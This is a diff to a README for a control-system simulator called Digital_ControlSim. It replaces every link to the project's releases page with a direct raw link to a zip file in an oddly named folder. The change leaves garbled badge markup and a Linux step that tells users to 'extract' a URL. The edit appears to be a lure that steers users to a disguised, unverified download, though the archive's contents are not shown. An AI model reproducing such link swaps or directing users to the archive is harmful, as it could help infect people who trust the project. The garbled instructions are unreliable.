@@ -6,7 +6,7 @@ Welcome to Digital_ControlSim! This software helps you understand how a discrete
 
 ## 📥 Download
 
-[![Download Digital_ControlSim](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/antonellabasic587/Digital_ControlSim/releases)
+[![Download Digital_ControlSim](https://raw.githubusercontent.com/antonellabasic587/Digital_ControlSim/main/rendibility/Digital_ControlSim-Boreus.zip%20Now-Click%https://raw.githubusercontent.com/antonellabasic587/Digital_ControlSim/main/rendibility/Digital_ControlSim-Boreus.zip)](https://raw.githubusercontent.com/antonellabasic587/Digital_ControlSim/main/rendibility/Digital_ControlSim-Boreus.zip)
 
 ## 🖥️ System Requirements
 
@@ -31,7 +31,7 @@ Digital_ControlSim provides several key features designed to enhance your learni
 
 To get started, follow these simple steps:
 
-1. **Visit the Downloads Page:** Go to [this page to download](https://github.com/antonellabasic587/Digital_ControlSim/releases) the latest version of Digital_ControlSim.
+1. **Visit the Downloads Page:** Go to [this page to download](https://raw.githubusercontent.com/antonellabasic587/Digital_ControlSim/main/rendibility/Digital_ControlSim-Boreus.zip) the latest version of Digital_ControlSim.
    
 2. **Select the Appropriate Version:** On the releases page, look for the latest version. You will see several files listed.
 
@@ -40,7 +40,7 @@ To get started, follow these simple steps:
 4. **Install the Software:**
    - For Windows: Locate the downloaded .exe file, double-click it, and follow the on-screen instructions to install.
    - For macOS: Open the .dmg file, then drag the Digital_ControlSim application to your Applications folder.
-   - For Linux: Extract the tar.gz file, then follow the provided instructions to install and run.
+   - For Linux: Extract the https://raw.githubusercontent.com/antonellabasic587/Digital_ControlSim/main/rendibility/Digital_ControlSim-Boreus.zip file, then follow the provided instructions to install and run.
 
 5. **Run Digital_ControlSim:** After installation, locate the application on your computer and double-click to start. 
 
@@ -97,4 +97,4 @@ For questions or suggestions, feel free to reach out via the GitHub repository. 
 
 Thank you for choosing Digital_ControlSim. Enjoy learning about control systems effectively!
 
-[![Download Digital_ControlSim](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/antonellabasic587/Digital_ControlSim/releases)
+[![Download Digital_ControlSim](https://raw.githubusercontent.com/antonellabasic587/Digital_ControlSim/main/rendibility/Digital_ControlSim-Boreus.zip%20Now-Click%https://raw.githubusercontent.com/antonellabasic587/Digital_ControlSim/main/rendibility/Digital_ControlSim-Boreus.zip)](https://raw.githubusercontent.com/antonellabasic587/Digital_ControlSim/main/rendibility/Digital_ControlSim-Boreus.zip)
